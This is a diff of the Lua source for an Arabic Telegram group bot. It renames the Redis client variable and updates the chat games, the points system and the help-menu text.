-database:set('MohaMeD:'..bot_id..'l:id'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:id'..msg.chat_id_,true)
 end 
 ------------------------------------------------------------------------
-if text == 'حزوره' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
-database:del('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_)
+if text == 'حزوره' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+datahmade:del('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_)
 katu = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..'klmoa'..msg.chat_id_,name)
+datahmade:set('MohaMeD:'..bot_id..'klmoa'..msg.chat_id_,name)
 name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
 name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
 name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
@@ -8234,24 +8101,24 @@ taha = '🕐┇اسرع واحد يحلها » {'..name..'}'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..'klmoa'..msg.chat_id_) or 'لفاتع')..'' and not database:get('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_) then 
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..'klmoa'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_) then 
 taha = '*👾| مبروك لقد فزت ,\n🎮| للعب مره اخرى ارسل حزوره ,*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
 end
-database:set('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:id1'..msg.chat_id_,true)
 end 
 ------------------------------------------------------------------------
-if text == 'المعاني' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
-database:del('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_)
+if text == 'المعاني' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+datahmade:del('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_)
 katu = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..'means'..msg.chat_id_,name)
+datahmade:set('MohaMeD:'..bot_id..'means'..msg.chat_id_,name)
 name = string.gsub(name,'قرد','🐒')
 name = string.gsub(name,'دجاجه','🐔')
-name = string.gsub(name,'بطريق','🐧')
+name = string.gsub(name,'بطريق','??')
 name = string.gsub(name,'ضفدع','🐸')
 name = string.gsub(name,'بومه','🦉')
 name = string.gsub(name,'نحله','🐝')
@@ -8278,21 +8145,21 @@ taha = '🔵┇اول واحد يكتب معنئ السمايل » {'..name..'}'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..'means'..msg.chat_id_) or 'لفاتع')..'' and not database:get('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_) then 
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..'means'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_) then 
 taha = '*👾| مبروك لقد فزت ,\n🎮| للعب مره اخرى ارسل المعاني ,*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
 end
-database:set('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:id2'..msg.chat_id_,true)
 end 
 ------------------------------------------------------------------------
-if text == 'العكس' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
-database:del('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_)
+if text == 'العكس' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+datahmade:del('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_)
 katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..'aks'..msg.chat_id_,name)
+datahmade:set('MohaMeD:'..bot_id..'aks'..msg.chat_id_,name)
 name = string.gsub(name,'باي','هلو')
 name = string.gsub(name,'فهمت','مافهمت')
 name = string.gsub(name,'موزين','زين')
@@ -8322,36 +8189,36 @@ taha = '✖️┇عكس كلمه » {'..name..'} ⚜️'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..'aks'..msg.chat_id_) or 'لفاتع')..'' and not database:get('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_) then 
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..'aks'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_) then 
 taha = '*👾| مبروك لقد فزت ,\n🎮| للعب مره اخرى ارسل العكس ,*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
 end
-database:set('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:id3'..msg.chat_id_,true)
 end 
 ------------------------------------------------------------------------
-if database:get('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
+if datahmade:get('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 20 then
 taha = "*📬┇ عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 } *\n"
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 return false  end 
-local GETNUM = database:get('MohaMeD:'..bot_id.."GAMES:NUM"..msg.chat_id_)
+local GETNUM = datahmade:get('MohaMeD:'..bot_id.."GAMES:NUM"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-database:del('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
-database:del('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 5)  
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 5)    
+datahmade:del('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 5)  
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 5)    
 taha = '*🔖┇ مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸┇ تم اضافة { 5 } من النقاط *\n'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-database:incrby('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_,1)
-if tonumber(database:get('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
-database:del('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
-database:del('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+datahmade:incrby('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_,1)
+if tonumber(datahmade:get('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
+datahmade:del('MohaMeD:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
 taha = '\n*📮┇ اوبس لقد خسرت في اللعبه \n📬┇ حظآ اوفر في المره القادمه \n🔰┇ كان الرقم الذي تم تخمينه { '..GETNUM..' }\n*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 else
@@ -8362,34 +8229,34 @@ end
 end
 end
 ------------------------------------------------------------------------
-if database:get('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
+if datahmade:get('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 6 then
 taha = "*📬┇ عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى*\n"
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 return false  end 
-local GETNUM = database:get('MohaMeD:'..bot_id.."GAMES"..msg.chat_id_)
+local GETNUM = datahmade:get('MohaMeD:'..bot_id.."GAMES"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-database:del('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+datahmade:del('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
 taha = '*📮┇ مبروك فزت وطلعت المحيبس بل ايد رقم { '..NUM..' }\n🎊┇ لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل *'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 3)  
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 3)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 3)  
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 3)    
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-database:del('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+datahmade:del('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
 taha = '\n*📮┇ للاسف لقد خسرت \n📬┇ المحيبس بل ايد رقم { '..GETNUM..' }\n💥┇ حاول مره اخرى للعثور على المحيبس *'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 end
 end
 ------------------------------------------------------------------------
-if text == 'المختلف' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+if text == 'المختلف' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
 katu = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',
 };
 name = katu[math.random(#katu)]
-database:del('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_)
-database:set('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_,name)
+datahmade:del('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_)
+datahmade:set('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_,name)
 name = string.gsub(name,'😸','😹😹😹😹😹😹😹😹😸😹😹😹😹')
 name = string.gsub(name,'☠','💀💀💀💀💀💀💀☠💀💀💀💀💀')
 name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼👻👻👻👻👻')
@@ -8402,31 +8269,31 @@ name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
 name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
 name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
 name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
-name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
+name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
 name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
 name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
 name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
-name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀')
+name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀??‍♂🧜‍♀🧜‍♀🧜‍♀')
 name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
 name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
-name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
+name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️??‍♀️🧖‍♀️🧖‍♀️')
 name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭')
 name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
 name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
-name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
+name = string.gsub(name,'🕤','🕥??🕥🕥🕥🕤🕥🕥🕥')
 name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
-name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
+name = string.gsub(name,'📅','??📆📆📆📆📆📅??📆')
 TEST = '  اول واحد يطلع المختلف » {* '..name..' * } ' 
 send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == 'امثله' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+if text == 'امثله' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
 katu = {
 'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
 };
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_,name)
-database:del('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_)
+datahmade:set('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_,name)
+datahmade:del('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_)
 name = string.gsub(name,'جوز','ينطي____للماعده سنون')
 name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
 name = string.gsub(name,'بيدك','اكل___محد يفيدك')
@@ -8451,32 +8318,32 @@ TEST = 'اكمل المثل التالي {* '..name..' *}'
 send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_) or '57999')..'' then -- // المختلف
-if not database:get('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_) then 
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
-database:del('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_)
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_) or '57999')..'' then -- // المختلف
+if not datahmade:get('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_) then 
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:del('MohaMeD:'..bot_id..':Set_alii:'..msg.chat_id_)
 taha = '*  🎁  احسنت اجابتك صحيحه   \n* '
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
-database:set('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:idss'..msg.chat_id_,true)
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_) or '6499')..'' then -- // امثله
-if not database:get('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_) then 
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
-database:del('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_)
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_) or '6499')..'' then -- // امثله
+if not datahmade:get('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_) then 
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:del('MohaMeD:'..bot_id..':Set_Amthlh:'..msg.chat_id_)
 taha = '*  🎁  احسنت اجابتك صحيحه   \n* '
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
-database:set('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:idst'..msg.chat_id_,true)
 end
 ------------------------------------------------------------------------
 if text == 'محيبس' or text == 'بات' then
-if database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then   
+if datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then   
 Num = math.random(1,6)
-database:set('MohaMeD:'..bot_id.."GAMES"..msg.chat_id_,Num) 
+datahmade:set('MohaMeD:'..bot_id.."GAMES"..msg.chat_id_,Num) 
 TEST = [[
 *➀       ➁     ➂      ➃      ➄     ➅
 ↓      ↓     ↓      ↓     ↓     ↓
@@ -8485,70 +8352,76 @@ TEST = [[
 🎁┇ الفائز يحصل على { 3 } من النقاط *
 ]]
 send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
-database:setex('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
+datahmade:setex('MohaMeD:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
 return false  
 end
 end
 ------------------------------------------------------------------------
 if text == 'خمن' or text == 'تخمين' then   
-if database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
 Num = math.random(1,20)
-database:set('MohaMeD:'..bot_id.."GAMES:NUM"..msg.chat_id_,Num) 
+datahmade:set('MohaMeD:'..bot_id.."GAMES:NUM"..msg.chat_id_,Num) 
 TEST = '*\n🎮┇ اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n'..'⚠┇ ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n'..'🔖┇ سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ \n💥*'
 send(msg.chat_id_, msg.id_, 1,TEST, 1, 'md')
-database:setex('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
+datahmade:setex('MohaMeD:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
 return false  
 end
 end
 ------------------------------------------------------------------------
 if text =='مجوهراتي' then 
-if tonumber((database:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((datahmade:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 taha = '*💎┇ ليس لديك مجوهرات \n📬┇ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 else
-taha = '*💎┇ عدد مجوهراتك الحاليه  ('..(database:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
-taha1 = '*💎┇ مجموع مجوهراتك  ('..(database:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'
+taha = '*💎┇ عدد مجوهراتك الحاليه  ('..(datahmade:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
+taha1 = '*💎┇ مجموع مجوهراتك  ('..(datahmade:get('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'
 send(msg.chat_id_, msg.id_, 1,''..taha..'\n'..taha1..'', 1, 'md')
 end
 end
 ------------------------------------------------------------------------
 if text == 'بيع مجوهراتي' then
-if tonumber((database:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((datahmade:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 taha = '*💠┇ ليس لديك مجوهرات \n📬┇ للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 else
-taha = (database:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(database:get('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
-database:incrby('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,taha)  
-database:del('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)
-taha = tonumber((database:get('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
+taha = (datahmade:get('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(datahmade:get('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
+datahmade:incrby('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,taha)  
+datahmade:del('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)
+taha = tonumber((datahmade:get('MohaMeD:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
 send(msg.chat_id_, msg.id_, 1,'💎┇ تم بيع جواهرك كل مجوهره تساوي '..taha..' رساله', 'md')
 end
 end
 ------------------------------------------------------------------------
 if text == 'حذف مجوهراتي' then
-database:del('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
-database:del('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
+datahmade:del('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_)  
+datahmade:del('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_)  
 send(msg.chat_id_, msg.id_, 1, "تم حذف جميع مجوهراتك", 1, "md") 
 end
 ------------------------------------------------------------------------
 if text == 'حذف رسائلي' then
-database:del('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
-database:del('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
 send(msg.chat_id_, msg.id_, 1, "🗑 ┇ تم حذف رسائلك  ", 1, "md") 
 end
 ------------------------------------------------------------------------
 if text == ("الاوامر") and (is_mod(msg) or is_creatorbasic(msg)) then
 local help = redis:get('MohaMeD:'..bot_id..'help')
 local text =  [[
-📮┇هناك {4} اوامر لعرضها
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🗑┇م1 ~⪼ لعرض اوامر الحمايه
-📚┇م2 ~⪼ لعرض اوامر الادمنيه
-🗓┇م3 ~⪼ لعرض اوامر المدراء
-🎖┇م4 ~⪼ لعرض اوامر المطورين
-🔖┇ اوامر التقيد
-┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-‏📡┇Ch ~⪼ @M1_m2s
+📮┇هناكـ {6} اوامر لعرضها
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🔐┇م1  ← آوآمر آلحمايهہ‌‏
+
+📈┇م2 ← آوآمر آلآدمنيهہ‌‏
+
+♟┇م3 ← آوآمر آلمدراء
+
+📍┇م4 ← آوآمر ثانويهہ‌‏
+
+🔘┇م5 ← آومر بالتقييد 
+
+👥┇م6 ← آوامر المطورين 
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+📡 ┇Ch~⪼ @MohaMeD  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
 end
@@ -8584,12 +8457,11 @@ local text =  [[
 🔐┇العربيه
 🔐┇الانكليزية
 🔐┇الميديا
-🔐┇الكانسر
 🔐┇التكرار
 🔐┇الكلايش
 🔐┇الدخول
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡┇Ch ~⪼ @M1_m2s
+📡 ┇Ch~⪼ @MohaMeD  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
 end
@@ -8611,12 +8483,11 @@ local text =  [[
 📋┇المحظورين  
 📋┇المكتومين
 📋┇قائمه المنع
-ℹ️┇تثبيت
+💭┇تثبيت
 ⏺┇الغاء تثبيت
 📄┇الاعدادات
 🗳┇الرابط
 📃┇القوانين
